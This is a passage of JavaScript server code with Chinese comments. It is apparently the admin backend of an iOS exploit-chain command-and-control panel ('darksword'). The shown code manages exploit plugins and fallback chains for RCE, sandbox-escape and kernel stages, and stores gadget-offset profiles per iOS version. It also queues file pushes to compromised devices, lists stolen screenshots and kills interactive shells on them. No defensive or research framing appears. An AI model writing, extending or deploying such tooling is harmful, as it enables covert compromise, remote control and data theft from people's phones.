  }

  // DELETE /admin/api/shell/:deviceId — 终止 Shell 会话
  const shellKillMatch = pathname.match(/^\/admin\/api\/shell\/([^/]+)$/);
  if (shellKillMatch && method === 'DELETE') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    
    const deviceId = decodeURIComponent(shellKillMatch[1]);
    let killed = false;
    
    if (interactiveShell && typeof interactiveShell.killSession === 'function') {
      killed = interactiveShell.killSession(deviceId);
    }
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: killed }));
  }

  // ── 插件管理 API（需认证）─────────────────────────────────────────────────

  // GET /admin/api/plugins — 管理端插件列表（需认证）
  if (pathname === '/admin/api/plugins' && method === 'GET') {
    try {
      const pluginsDir = path.join(__dirname, '..', 'client', 'plugins');
      const plugins = [];
      
      if (fs.existsSync(pluginsDir)) {
        const dirs = fs.readdirSync(pluginsDir);
        
        for (const dir of dirs) {
          const manifestPath = path.join(pluginsDir, dir, 'manifest.json');
          if (fs.existsSync(manifestPath)) {
            try {
              const content = fs.readFileSync(manifestPath, 'utf8');
              const manifest = JSON.parse(content);
              const exploitPath = path.join(pluginsDir, dir, 'exploit.js');
              const stat = fs.existsSync(exploitPath) ? fs.statSync(exploitPath) : null;
              
              plugins.push({
                id: manifest.id,
                targetStage: manifest.targetStage,
                minIOS: manifest.minIOS,
                maxIOS: manifest.maxIOS,
                reliability: manifest.reliability,
                enabled: manifest.enabled !== false,
                description: manifest.description || '',
                size: stat ? stat.size : 0,
                lastModified: stat ? stat.mtime.getTime() : 0
              });
            } catch (e) {
              console.error(`[Plugins] Failed to parse ${dir}/manifest.json:`, e.message);
            }
          }
        }
      }
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ total: plugins.length, plugins }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to list plugins' }));
    }
  }

  // POST /admin/api/plugins/:id/toggle — 启用/禁用插件（需认证 + CSRF）
  const pluginToggleMatch = pathname.match(/^\/admin\/api\/plugins\/([^/]+)\/toggle$/);
  if (pluginToggleMatch && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    
    const pluginId = decodeURIComponent(pluginToggleMatch[1]);
    
    if (!/^[a-zA-Z0-9_-]+$/.test(pluginId)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid plugin ID' }));
    }
    
    try {
      const manifestPath = path.join(__dirname, '..', 'client', 'plugins', pluginId, 'manifest.json');
      
      if (!fs.existsSync(manifestPath)) {
        res.writeHead(404, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Plugin not found' }));
      }
      
      const content = fs.readFileSync(manifestPath, 'utf8');
      const manifest = JSON.parse(content);
      manifest.enabled = !(manifest.enabled !== false);
      
      fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, enabled: manifest.enabled }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to toggle plugin' }));
    }
  }

  // DELETE /admin/api/plugins/:id — 删除插件（需认证 + CSRF）
  const pluginDeleteMatch = pathname.match(/^\/admin\/api\/plugins\/([^/]+)$/);
  if (pluginDeleteMatch && method === 'DELETE') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    
    const pluginId = decodeURIComponent(pluginDeleteMatch[1]);
    
    if (!/^[a-zA-Z0-9_-]+$/.test(pluginId)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid plugin ID' }));
    }
    
    try {
      const pluginDir = path.join(__dirname, '..', 'client', 'plugins', pluginId);
      
      if (!fs.existsSync(pluginDir)) {
        res.writeHead(404, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Plugin not found' }));
      }
      
      fs.rmSync(pluginDir, { recursive: true, force: true });
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to delete plugin' }));
    }
  }

  // ── Exploit 管理 API（需认证）────────────────────────────────────────────────

  // GET /admin/api/exploits — 列出所有已注册 exploit（内置 + 插件）
  if (pathname === '/admin/api/exploits' && method === 'GET') {
    try {
      const registryPath = path.join(__dirname, '..', 'client', 'exploit_registry.js');
      const pluginsDir = path.join(__dirname, '..', 'client', 'plugins');
      const exploits = [];

      // 解析内置 registry
      if (fs.existsSync(registryPath)) {
        const content = fs.readFileSync(registryPath, 'utf8');
        const match = content.match(/const\s+EXPLOIT_REGISTRY\s*=\s*\[([\s\S]*?)\];/);
        if (match) {
          try {
            const arrStr = '[' + match[1].replace(/\/\/[^\n]*/g, '').replace(/,\s*\]/g, ']') + ']';
            const parsed = (new Function('return ' + arrStr))();
            for (const entry of parsed) {
              exploits.push({ ...entry, source: 'builtin', enabled: true });
            }
          } catch (e) { /* 解析失败忽略 */ }
        }
      }

      // 解析插件
      if (fs.existsSync(pluginsDir)) {
        const dirs = fs.readdirSync(pluginsDir);
        for (const dir of dirs) {
          const manifestPath = path.join(pluginsDir, dir, 'manifest.json');
          if (fs.existsSync(manifestPath)) {
            try {
              const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
              exploits.push({ ...manifest, source: 'plugin', enabled: manifest.enabled !== false });
            } catch (e) { /* skip */ }
          }
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ total: exploits.length, exploits }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to list exploits' }));
    }
  }

  // POST /admin/api/exploits/:id/toggle — 启用/禁用 exploit（仅插件类型可切换）
  const exploitToggleMatch = pathname.match(/^\/admin\/api\/exploits\/([^/]+)\/toggle$/);
  if (exploitToggleMatch && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const exploitId = decodeURIComponent(exploitToggleMatch[1]);
    const pluginsDir = path.join(__dirname, '..', 'client', 'plugins');
    let found = false;

    if (fs.existsSync(pluginsDir)) {
      const dirs = fs.readdirSync(pluginsDir);
      for (const dir of dirs) {
        const manifestPath = path.join(pluginsDir, dir, 'manifest.json');
        if (fs.existsSync(manifestPath)) {
          try {
            const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
            if (manifest.id === exploitId) {
              manifest.enabled = !(manifest.enabled !== false);
              fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
              found = true;
              res.writeHead(200, { 'Content-Type': 'application/json' });
              return res.end(JSON.stringify({ ok: true, enabled: manifest.enabled }));
            }
          } catch (e) { /* skip */ }
        }
      }
    }

    if (!found) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Exploit not found or is builtin (cannot toggle)' }));
    }
  }

  // GET /admin/api/exploits/stats — exploit 统计（成功率/使用次数）
  if (pathname === '/admin/api/exploits/stats' && method === 'GET') {
    try {
      const stats = {};
      let dbStats = [];

      if (dbReady) {
        try {
          const logs = await db.getRecentLogs(10000, 'cmd');
          // 从日志中提取 exploit 相关统计
          for (const log of logs) {
            const msg = log.message || '';
            const match = msg.match(/command queued:\s*(\S+)/);
            if (match) {
              const cmdType = match[1];
              if (!stats[cmdType]) stats[cmdType] = { attempts: 0, success: 0, fail: 0 };
              stats[cmdType].attempts++;
            }
          }
          // 从所有设备的 cmd_results 统计成功/失败
          const allDeviceIds = Array.from(devices.keys());
          for (const did of allDeviceIds.slice(0, 100)) {
            try {
              const cmdHistory = await db.getCommandHistory(did, 500);
              for (const result of cmdHistory) {
                const cmdType = result.cmd_type || '';
                if (!stats[cmdType]) stats[cmdType] = { attempts: 0, success: 0, fail: 0 };
                if (result.status === 'done') stats[cmdType].success++;
                else if (result.status === 'failed') stats[cmdType].fail++;
              }
            } catch (e) { /* skip device */ }
          }
        } catch (e) {
          // DB 查询失败，仅用内存数据
        }
      }

      // 基于内存设备数据的 stage 统计
      const stageStats = {};
      for (const [, device] of devices.entries()) {
        const stage = device.stage || 'unknown';
        if (!stageStats[stage]) stageStats[stage] = { attempts: 0, success: 0 };
        stageStats[stage].attempts++;
        if (device.execStatus === 'done') {
          stageStats[stage].success++;
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ commandStats: stats, stageStats }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to get exploit stats' }));
    }
  }

  // ── Profile 管理 API（需认证）───────────────────────────────────────────────

  const profilesDir = path.join(__dirname, '..', 'profiles');

  // GET /admin/api/profiles — 列出所有 profile
  if (pathname === '/admin/api/profiles' && method === 'GET') {
    try {
      const profiles = [];
      if (fs.existsSync(profilesDir)) {
        const files = fs.readdirSync(profilesDir).filter(f => f.endsWith('.json'));
        for (const file of files) {
          const filePath = path.join(profilesDir, file);
          const stat = fs.statSync(filePath);
          profiles.push({
            name: file.replace('.json', ''),
            filename: file,
            size: stat.size,
            lastModified: stat.mtime.getTime()
          });
        }
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ total: profiles.length, profiles }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to list profiles' }));
    }
  }

  // GET /admin/api/profiles/:name — 读取指定 profile
  const profileGetMatch = pathname.match(/^\/admin\/api\/profiles\/([^/]+)$/);
  if (profileGetMatch && method === 'GET') {
    const profileName = decodeURIComponent(profileGetMatch[1]);
    if (!/^[a-zA-Z0-9_.-]+$/.test(profileName)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid profile name' }));
    }

    const filename = profileName.endsWith('.json') ? profileName : profileName + '.json';
    const filePath = path.join(profilesDir, filename);

    if (!fs.existsSync(filePath)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Profile not found' }));
    }

    try {
      const content = fs.readFileSync(filePath, 'utf8');
      const parsed = JSON.parse(content);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ name: profileName, profile: parsed }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to read profile' }));
    }
  }

  // PUT /admin/api/profiles/:name — 更新 profile（校验 gadget 字段）
  const profilePutMatch = pathname.match(/^\/admin\/api\/profiles\/([^/]+)$/);
  if (profilePutMatch && method === 'PUT') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const profileName = decodeURIComponent(profilePutMatch[1]);
    if (!/^[a-zA-Z0-9_.-]+$/.test(profileName)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid profile name' }));
    }

    const filename = profileName.endsWith('.json') ? profileName : profileName + '.json';
    const filePath = path.join(profilesDir, filename);

    if (!fs.existsSync(filePath)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Profile not found' }));
    }

    try {
      const data = await parseBody(req);

      // 校验必要字段
      const requiredFields = ['ios_version', 'device_model'];
      for (const field of requiredFields) {
        if (!data[field]) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: `Missing required field: ${field}` }));
        }
      }

      // 校验 gadget offsets 格式
      if (data.gadgets && typeof data.gadgets === 'object') {
        for (const [key, val] of Object.entries(data.gadgets)) {
          if (typeof val !== 'string' && typeof val !== 'number') {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: `Invalid gadget offset type for "${key}"` }));
          }
        }
      }

      fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, name: profileName }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid JSON body: ' + e.message }));
    }
  }

  // POST /admin/api/profiles — 创建新 profile
  if (pathname === '/admin/api/profiles' && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    try {
      const data = await parseBody(req);

      if (!data.name || !/^[a-zA-Z0-9_.-]+$/.test(data.name)) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Invalid or missing profile name' }));
      }

      const filename = data.name.endsWith('.json') ? data.name : data.name + '.json';
      const filePath = path.join(profilesDir, filename);

      if (fs.existsSync(filePath)) {
        res.writeHead(409, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Profile already exists' }));
      }

      const profile = data.profile || data;
      delete profile.name;

      if (!profile.ios_version || !profile.device_model) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Missing required fields: ios_version, device_model' }));
      }

      if (!fs.existsSync(profilesDir)) {
        fs.mkdirSync(profilesDir, { recursive: true });
      }

      fs.writeFileSync(filePath, JSON.stringify(profile, null, 2));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, name: data.name }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid JSON body: ' + e.message }));
    }
  }

  // DELETE /admin/api/profiles/:name — 删除 profile
  const profileDeleteMatch = pathname.match(/^\/admin\/api\/profiles\/([^/]+)$/);
  if (profileDeleteMatch && method === 'DELETE') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const profileName = decodeURIComponent(profileDeleteMatch[1]);
    if (!/^[a-zA-Z0-9_.-]+$/.test(profileName)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid profile name' }));
    }

    // 禁止删除模板文件
    if (profileName.includes('template')) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Cannot delete template profile' }));
    }

    const filename = profileName.endsWith('.json') ? profileName : profileName + '.json';
    const filePath = path.join(profilesDir, filename);

    if (!fs.existsSync(filePath)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Profile not found' }));
    }

    try {
      fs.unlinkSync(filePath);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to delete profile' }));
    }
  }

  // ── 日志与审计 API（需认证）─────────────────────────────────────────────────

  // GET /admin/api/logs — 查询系统日志（支持 type/level/device 过滤，分页）
  if (pathname === '/admin/api/logs' && method === 'GET') {
    try {
      const params = new URLSearchParams(parsed.search || '');
      const logType = params.get('type') || null;
      const level = params.get('level') || null;
      const deviceFilter = params.get('device') || null;
      const page = Math.max(1, parseInt(params.get('page') || '1', 10));
      const pageSize = Math.min(200, Math.max(10, parseInt(params.get('pageSize') || '50', 10)));

      if (dbReady) {
        // 从数据库查询（完整 SQL 带过滤和分页）
        const allowedTypes = ['auth', 'device', 'cmd', 'loot', 'system'];
        const allowedLevels = ['info', 'warn', 'error', 'debug'];
        
        let sql = 'SELECT * FROM system_logs WHERE 1=1';
        let countSql = 'SELECT COUNT(*) as total FROM system_logs WHERE 1=1';
        const sqlParams = [];
        const countParams = [];

        if (logType && allowedTypes.includes(logType)) {
          sql += ' AND log_type = ?';
          countSql += ' AND log_type = ?';
          sqlParams.push(logType);
          countParams.push(logType);
        }
        if (level && allowedLevels.includes(level)) {
          sql += ' AND log_level = ?';
          countSql += ' AND log_level = ?';
          sqlParams.push(level);
          countParams.push(level);
        }
        if (deviceFilter && /^[a-zA-Z0-9_-]+$/.test(deviceFilter)) {
          sql += ' AND device_id = ?';
          countSql += ' AND device_id = ?';
          sqlParams.push(deviceFilter);
          countParams.push(deviceFilter);
        }

        sql += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';
        sqlParams.push(pageSize, (page - 1) * pageSize);

        try {
          // 执行分页查询
          const [logRows] = await db.query(sql, sqlParams);
          // 执行计数
          let total = logRows.length;
          try {
            const [countRows] = await db.query(countSql, countParams);
            if (countRows && countRows[0]) total = countRows[0].total;
          } catch (e) { /* fallback to logRows.length */ }

          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ total, page, pageSize, logs: logRows }));
        } catch (e) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'DB query failed' }));
        }
      } else {
        // 内存模式无持久日志
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ total: 0, page, pageSize, logs: [], note: 'No DB connected, logs not persisted' }));
      }
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to query logs' }));
    }
  }

  // GET /admin/api/logs/export — 导出日志 CSV
  if (pathname === '/admin/api/logs/export' && method === 'GET') {
    try {
      let logs = [];
      if (dbReady) {
        logs = await db.getRecentLogs(10000);
      }

      const csvHeader = 'timestamp,level,type,device_id,message\n';
      const csvRows = logs.map(row => {
        const ts = row.created_at ? new Date(row.created_at).toISOString() : '';
        const msg = (row.message || '').replace(/"/g, '""');
        return `"${ts}","${row.log_level || ''}","${row.log_type || ''}","${row.device_id || ''}","${msg}"`;
      }).join('\n');

      res.writeHead(200, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="darksword_logs_${Date.now()}.csv"`
      });
      return res.end(csvHeader + csvRows);
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to export logs' }));
    }
  }

  // GET /admin/api/metrics — 实时 metrics 仪表盘数据
  if (pathname === '/admin/api/metrics' && method === 'GET') {
    try {
      const now = Date.now();
      let onlineCount = 0;
      let totalDevices = devices.size;
      let stageDistribution = {};
      let avgOnlineMs = 0;
      let totalOnlineMs = 0;
      let successCount = 0;
      let failCount = 0;

      for (const [, device] of devices.entries()) {
        // 5分钟内有心跳算在线
        if (now - device.lastSeen < 5 * 60 * 1000) {
          onlineCount++;
        }
        const stage = device.stage || 'unknown';
        stageDistribution[stage] = (stageDistribution[stage] || 0) + 1;
        totalOnlineMs += (device.onlineMs || 0);

        if (device.execStatus === 'done') successCount++;
        else if (device.execStatus === 'failed') failCount++;
      }

      avgOnlineMs = totalDevices > 0 ? Math.round(totalOnlineMs / totalDevices) : 0;
      const chainSuccessRate = (successCount + failCount) > 0
        ? (successCount / (successCount + failCount) * 100).toFixed(1)
        : '0.0';

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        timestamp: now,
        devices: {
          total: totalDevices,
          online: onlineCount,
          offline: totalDevices - onlineCount
        },
        chain: {
          successRate: parseFloat(chainSuccessRate),
          successCount,
          failCount
        },
        stageDistribution,
        avgOnlineMs,
        uptime: process.uptime()
      }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to get metrics' }));
    }
  }

  // ── Chain 管理 API（需认证）─────────────────────────────────────────────────

  // GET /admin/api/chains — 查看当前 FALLBACK_CHAINS 配置
  if (pathname === '/admin/api/chains' && method === 'GET') {
    try {
      const registryPath = path.join(__dirname, '..', 'client', 'exploit_registry.js');
      let chains = {};

      if (fs.existsSync(registryPath)) {
        const content = fs.readFileSync(registryPath, 'utf8');
        const match = content.match(/const\s+FALLBACK_CHAINS\s*=\s*(\{[\s\S]*?\n\});/);
        if (match) {
          try {
            chains = (new Function('return ' + match[1]))();
          } catch (e) { /* parse failure */ }
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ chains }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to read chains' }));
    }
  }

  // PUT /admin/api/chains/:stage — 修改某 stage 的 fallback 链配置
  const chainPutMatch = pathname.match(/^\/admin\/api\/chains\/([^/]+)$/);
  if (chainPutMatch && method === 'PUT') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const stage = decodeURIComponent(chainPutMatch[1]).toUpperCase();
    const validStages = ['RCE', 'SANDBOX_ESCAPE', 'KERNEL_RW', 'KERNEL_PRIV', 'FINAL_PRIV', 'INITIAL_ENTRY'];
    if (!validStages.includes(stage)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid stage. Valid: ' + validStages.join(', ') }));
    }

    try {
      const data = await parseBody(req);

      if (!Array.isArray(data.entries)) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Body must contain "entries" array' }));
      }

      // 校验每个 entry 格式
      for (const entry of data.entries) {
        if (!entry.exploitId || typeof entry.exploitId !== 'string') {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Each entry must have exploitId (string)' }));
        }
        if (!entry.timeout || typeof entry.timeout !== 'number' || entry.timeout < 1000) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Each entry must have timeout >= 1000ms' }));
        }
        if (!entry.priority || typeof entry.priority !== 'number') {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Each entry must have priority (number)' }));
        }
      }

      // 读取并更新 exploit_registry.js 中的 FALLBACK_CHAINS
      const registryPath = path.join(__dirname, '..', 'client', 'exploit_registry.js');
      if (!fs.existsSync(registryPath)) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'exploit_registry.js not found' }));
      }

      let content = fs.readFileSync(registryPath, 'utf8');
      const chainsMatch = content.match(/const\s+FALLBACK_CHAINS\s*=\s*(\{[\s\S]*?\n\});/);
      if (!chainsMatch) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Cannot locate FALLBACK_CHAINS in registry' }));
      }

      let chains;
      try {
        chains = (new Function('return ' + chainsMatch[1]))();
      } catch (e) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Failed to parse FALLBACK_CHAINS' }));
      }

      chains[stage] = data.entries;

      // 序列化回文件
      const serialized = 'const FALLBACK_CHAINS = ' + JSON.stringify(chains, null, 2) + ';';
      content = content.replace(/const\s+FALLBACK_CHAINS\s*=\s*\{[\s\S]*?\n\};/, serialized);
      fs.writeFileSync(registryPath, content);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, stage, entries: data.entries }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid request: ' + e.message }));
    }
  }

  // POST /admin/api/chains/test — dry-run：检查约束匹配（不执行 exploit）
  if (pathname === '/admin/api/chains/test' && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    try {
      const data = await parseBody(req);
      const { deviceId, iosVersion, stage } = data;

      if (!iosVersion) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'iosVersion is required' }));
      }

      // 读取 FALLBACK_CHAINS
      const registryPath = path.join(__dirname, '..', 'client', 'exploit_registry.js');
      let chains = {};
      if (fs.existsSync(registryPath)) {
        const content = fs.readFileSync(registryPath, 'utf8');
        const match = content.match(/const\s+FALLBACK_CHAINS\s*=\s*(\{[\s\S]*?\n\});/);
        if (match) {
          try { chains = (new Function('return ' + match[1]))(); } catch (e) {}
        }
      }

      // 读取 EXPLOIT_REGISTRY
      let registry = [];
      if (fs.existsSync(registryPath)) {
        const content = fs.readFileSync(registryPath, 'utf8');
        const match = content.match(/const\s+EXPLOIT_REGISTRY\s*=\s*\[([\s\S]*?)\];/);
        if (match) {
          try {
            const arrStr = '[' + match[1].replace(/\/\/[^\n]*/g, '').replace(/,\s*\]/g, ']') + ']';
            registry = (new Function('return ' + arrStr))();
          } catch (e) {}
        }
      }

      // 版本比较工具
      const versionCmp = (a, b) => {
        const pa = a.split('.').map(Number);
        const pb = b.split('.').map(Number);
        for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
          const na = pa[i] || 0, nb = pb[i] || 0;
          if (na !== nb) return na - nb;
        }
        return 0;
      };

      const targetStages = stage ? [stage.toUpperCase()] : Object.keys(chains);
      const results = {};

      for (const s of targetStages) {
        const chainEntries = chains[s] || [];
        results[s] = [];

        for (const entry of chainEntries) {
          const exploit = registry.find(e => e.id === entry.exploitId);
          let match = false;
          let reason = '';

          if (!exploit) {
            reason = 'exploit not found in registry';
          } else {
            const minOk = !exploit.minIOS || versionCmp(iosVersion, exploit.minIOS) >= 0;
            const maxOk = !exploit.maxIOS || versionCmp(iosVersion, exploit.maxIOS) <= 0;
            match = minOk && maxOk;
            if (!match) {
              reason = `iOS ${iosVersion} out of range [${exploit.minIOS || '*'}, ${exploit.maxIOS || '*'}]`;
            }
          }

          results[s].push({
            exploitId: entry.exploitId,
            priority: entry.priority,
            timeout: entry.timeout,
            match,
            reason: match ? 'compatible' : reason
          });
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ iosVersion, deviceId: deviceId || null, results }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid request: ' + e.message }));
    }
  }

  // ── 后渗透支持 API（需认证）─────────────────────────────────────────────────

  // POST /admin/api/file-push/:deviceId — 推送文件到设备（排入命令队列）
  const filePushMatch = pathname.match(/^\/admin\/api\/file-push\/([^/]+)$/);
  if (filePushMatch && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const deviceId = decodeURIComponent(filePushMatch[1]);
    if (!devices.has(deviceId)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Device not found' }));
    }

    try {
      const data = await parseBody(req);
      const targetPath = data.path || '';
      const fileContent = data.content || ''; // base64
      const fileUrl = data.url || '';

      if (!targetPath) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'target path is required' }));
      }
      if (!fileContent && !fileUrl) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'content (base64) or url is required' }));
      }

      // 写入临时目录供设备拉取
      const fileId = crypto.randomBytes(16).toString('hex');
      const stagingDir = path.join(__dirname, '..', 'staging');
      if (!fs.existsSync(stagingDir)) fs.mkdirSync(stagingDir, { recursive: true });

      if (fileContent) {
        const buf = Buffer.from(fileContent, 'base64');
        fs.writeFileSync(path.join(stagingDir, fileId), buf);
      }

      // 将 file_upload 命令排入队列
      const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
      const cmdArgs = { path: targetPath, url: fileUrl || `/staging/${fileId}` };

      if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
      cmdQueue.get(deviceId).push({ cmdId, type: 'file_upload', args: cmdArgs });

      if (dbReady) {
        try { await db.addCommand(cmdId, deviceId, 'file_upload', cmdArgs, 'admin'); } catch (e) {}
      }

      if (dbReady) {
        try { await db.logEvent('info', 'cmd', `file_upload queued: ${targetPath}`, deviceId); } catch (e) {}
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, cmdId, fileId, targetPath }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid request: ' + e.message }));
    }
  }

  // GET /admin/api/screenshots/:deviceId — 获取设备截图历史
  const screenshotsMatch = pathname.match(/^\/admin\/api\/screenshots\/([^/]+)$/);
  if (screenshotsMatch && method === 'GET') {
    const deviceId = decodeURIComponent(screenshotsMatch[1]);
    if (!devices.has(deviceId)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Device not found' }));
    }

    try {
      const screenshots = [];

      // 从 loot 存储中提取截图
      if (dbReady) {
        try {
          const loot = await db.getDeviceLoot(deviceId);
          if (loot && loot.files) {
            for (const f of loot.files) {
              if (f.name && /screenshot|snap|\.png$|\.jpg$/i.test(f.name)) {
                screenshots.push({
                  name: f.name,
                  size: f.size,
                  timestamp: f.ts,
                  path: f.path || null
                });
              }
            }
          }
        } catch (e) {}
      } else {
        // 从内存 lootStore 查找
        const deviceLoot = lootStore.get(deviceId);
